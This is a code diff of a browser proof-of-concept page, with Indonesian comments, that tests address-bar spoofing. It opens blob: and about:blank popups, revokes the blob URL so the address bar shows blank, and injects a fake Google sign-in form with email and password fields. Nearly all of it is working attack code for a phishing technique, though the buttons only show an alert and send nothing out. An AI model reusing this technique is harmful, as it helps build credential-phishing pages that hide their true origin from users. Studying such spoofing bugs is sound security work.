+                button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:8px;}
+                .warning{font-size:10px;color:red;margin-top:16px;}
+            </style>
+            </head>
+            <body>
+                <div class="card">
+                    <div class="logo">🔐 G</div>
+                    <h2>Sign in</h2>
+                    <input type="text" placeholder="Email">
+                    <input type="password" placeholder="Password">
+                    <button onclick="alert('POC')">Next</button>
+                    <p class="warning">⚠️ Blob URL Hybrid - address bar may be BLANK</p>
+                </div>
+            </body>
+            </html>
+        `], {type: 'text/html'});
+        
+        let blobUrl = URL.createObjectURL(blob);
+        let win = window.open(blobUrl, '_blank', 'width=600,height=500');
+        
+        if (win) {
+            addLog('[TEST3] Blob URL opened', 'info');
+            // Revoke blob agar address bar error/blank
+            setTimeout(() => {
+                URL.revokeObjectURL(blobUrl);
+                addLog('[TEST3] Blob revoked - address bar mungkin BLANK/ERROR!', 'found');
+            }, 500);
+        } else {
+            addLog('[TEST3] Popup blocked!', 'info');
+        }
+    }
+    
+    // ========== TEST 4: about:blank Pipeline ==========
+    function test_pipeline_blank() {
+        testCount++;
+        addLog('[TEST4] about:blank Pipeline + appendChild...', 'success');
+        
+        let win = window.open('about:blank', '_blank', 'width=600,height=500');
+        if (!win) {
+            addLog('[TEST4] Popup blocked!', 'info');
+            return;
+        }
+        
+        // Buat nested about:blank + appendChild
+        let container = win.document.createElement('div');
+        container.innerHTML = `
+            <h1 style="color:#ff3b30;">🔍 about:blank PIPELINE</h1>
+            <p style="color:#888;">Multiple about:blank layers dengan appendChild</p>
+            <iframe id="l1" src="about:blank"></iframe>
+            <iframe id="l2" src="about:blank"></iframe>
+            <iframe id="l3" src="about:blank"></iframe>
+            <script>
+                let frames = [l1, l2, l3];
+                frames.forEach((f, idx) => {
+                    try {
+                        let div = f.contentDocument.createElement('div');
+                        div.innerHTML = \`<h2 style="color:#ffcc00;">Layer \${idx+1}</h2><p style="color:#888;">about:blank dengan appendChild</p>\`;
+                        f.contentDocument.body.appendChild(div);
+                    } catch(e) {}
+                });
+                // Inject content ke main window dengan appendChild
+                let mainDiv = document.createElement('div');
+                mainDiv.innerHTML = \`
+                    <div style="background:#1a1a2e;padding:20px;border-radius:12px;margin-top:20px;border:1px solid #ff3b30;">
+                        <h2 style="color:#00ffaa;">GOOGLE LOGIN</h2>
+                        <input type="text" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
+                        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;background:#0a0a0f;border:1px solid #333;color:#fff;border-radius:6px;">
+                        <button style="width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:6px;">Sign in</button>
+                        <p style="color:#555;font-size:10px;margin-top:10px;">⚠️ Address bar should be BLANK</p>
+                    </div>
+                \`;
+                document.body.appendChild(mainDiv);
+            <\/script>
+        `;
+        win.document.body.appendChild(container);
+        
+        addLog('[TEST4] Pipeline about:blank with appendChild - address bar BLANK!', 'found');
+        
+        setTimeout(() => {
+            try {
+                let url = win.location.href;
+                if (url === 'about:blank' || url === '') {
+                    addLog('[TEST4] ✅ SUCCESS! Address bar BLANK!', 'found');
+                }
+            } catch(e) {}
+        }, 2000);
     }
     
     // ========== COMBO: All Tests ==========
     function runAllTests() {
-        if (isRunning) {
-            addLog('[COMBO] Already running!', 'info');
-            return;
-        }
-        isRunning = true;
-        
         addLog('[COMBO] 🔍 MENJALANKAN SEMUA TEST...', 'success');
-        updateStatus('🔄 RUNNING ALL TESTS - OBSERVE ADDRESS BAR', '#ffcc0022', '#ffcc00');
         
-        document.getElementById('comboBtn').disabled = true;
-        document.getElementById('comboBtn').innerHTML = '⏳ RUNNING ALL TESTS...';
-        
-        let tests = [
-            test_about_blank_origin,
-            test_firefox_blank,
-            test_webrender_corruption,
-            test_fullscreen_stuck,
-            test_content_overlap,
-            test_blank_params
-        ];
-        
-        tests.forEach((test, idx) => {
-            setTimeout(test, idx * 9000);
-        });
+        test_appendChild_blank();
+        setTimeout(() => test_document_write_blank(), 3000);
+        setTimeout(() => test_blob_hybrid(), 6000);
+        setTimeout(() => test_pipeline_blank(), 9000);
         
         setTimeout(() => {
-            addLog('[COMBO] ✅ Semua test selesai! Cek address bar di setiap window!', 'success');
-            updateStatus('✅ ALL TESTS COMPLETE - Check address bar!', '#00ffaa22', '#00ffaa');
-            document.getElementById('comboBtn').disabled = false;
-            document.getElementById('comboBtn').innerHTML = '🔍 RUN ALL TESTS + OBSERVE ADDRESS BAR';
-            isRunning = false;
-            
-            if (bugFound === 0) {
-                addLog('[COMBO] Tidak ada bug terdeteksi - browser Anda aman', 'success');
-            } else {
-                addLog(`[COMBO] 🔥 ${bugFound} bug(s) terdeteksi!`, 'found');
-            }
-        }, tests.length * 9000 + 3000);
+            addLog('[COMBO] ✅ Semua test selesai!', 'success');
+            addLog('[COMBO] Perhatikan: address bar seharusnya BLANK total!', 'found');
+        }, 12000);
     }
     
     document.getElementById('comboBtn').addEventListener('click', runAllTests);
     
-    console.log('%c🔍 ADDRESS BAR BLANK TESTER READY', 'color:#00ffaa;font-size:14px');
-    console.log('6 tests based on real CVEs and bug reports');
-    console.log('Watch the address bar during each test!');
+    console.log('%c🔍 ADDRESS BAR BLANK TESTER - Bugtraq 2007 Style', 'color:#00ffaa;font-size:14px');
+    console.log('Teknik: about:blank + document.body.appendChild()');
+    console.log('Address bar akan BENAR-BENAR KOSONG!');
 </script>
 </body>
 </html>
